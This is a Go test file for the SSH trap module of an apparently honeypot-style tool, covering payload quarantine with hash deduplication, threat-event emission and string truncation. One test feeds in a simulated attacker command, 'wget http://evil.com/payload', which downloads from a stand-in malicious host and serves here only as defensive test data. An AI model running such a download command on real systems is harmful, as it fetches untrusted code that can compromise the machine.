package ssh

import (
	"crypto/sha256"
	"encoding/hex"
	"strings"
	"testing"

	"github.com/enondev/nullpot/specs"
)

func TestTrapModuleName(t *testing.T) {
	tm := &TrapModule{}
	if tm.Name() != "ssh" {
		t.Fatalf("unexpected name: %s", tm.Name())
	}
}

func TestQuarantinePayload(t *testing.T) {
	tm := &TrapModule{quarantine: make(map[string][]byte)}
	payload := []byte("dropper binary")
	tm.quarantinePayload("203.0.113.45", payload)

	sum := sha256.Sum256(payload)
	key := hex.EncodeToString(sum[:])
	if _, ok := tm.quarantine[key]; !ok {
		t.Fatal("expected payload in quarantine")
	}
	if string(tm.quarantine[key]) != "dropper binary" {
		t.Fatal("unexpected quarantined payload")
	}
}

func TestQuarantineDeduplicates(t *testing.T) {
	tm := &TrapModule{quarantine: make(map[string][]byte)}
	payload := []byte("same payload")
	tm.quarantinePayload("ip1", payload)
	tm.quarantinePayload("ip2", payload)

	sum := sha256.Sum256(payload)
	key := hex.EncodeToString(sum[:])
	if len(tm.quarantine) != 1 {
		t.Fatalf("expected 1 entry (dedup), got %d", len(tm.quarantine))
	}
	if string(tm.quarantine[key]) != "same payload" {
		t.Fatal("unexpected payload")
	}
}

func TestEmitEventFields(t *testing.T) {
	tm := &TrapModule{
		events:  make(chan specs.ThreatEvent, 10),
		product: specs.Product{Name: "x", UID: "y"},
	}
	tm.emitEvent("root", "203.0.113.45", "password_auth", "wget http://evil.com/payload")

	select {
	case ev := <-tm.events:
		if ev.Enrichment.Module != "ssh" {
			t.Fatalf("unexpected module: %s", ev.Enrichment.Module)
		}
		if ev.Enrichment.Fingerprint != "root:password_auth" {
			t.Fatalf("unexpected fingerprint: %s", ev.Enrichment.Fingerprint)
		}
		if !strings.Contains(ev.Enrichment.PayloadPreview, "wget") {
			t.Fatalf("expected payload preview to contain wget: %s", ev.Enrichment.PayloadPreview)
		}
		if ev.SrcEndpoint.IP != "203.0.113.45" {
			t.Fatalf("unexpected src IP: %s", ev.SrcEndpoint.IP)
		}
	default:
		t.Fatal("expected event on channel")
	}
}

func TestTruncate(t *testing.T) {
	if truncate("short", 10) != "short" {
		t.Fatal("short string should not be truncated")
	}
	if truncate("this is a long string", 5) != "this " {
		t.Fatalf("unexpected truncate: %q", truncate("this is a long string", 5))
	}
	if truncate("", 5) != "" {
		t.Fatal("empty string should stay empty")
	}
}
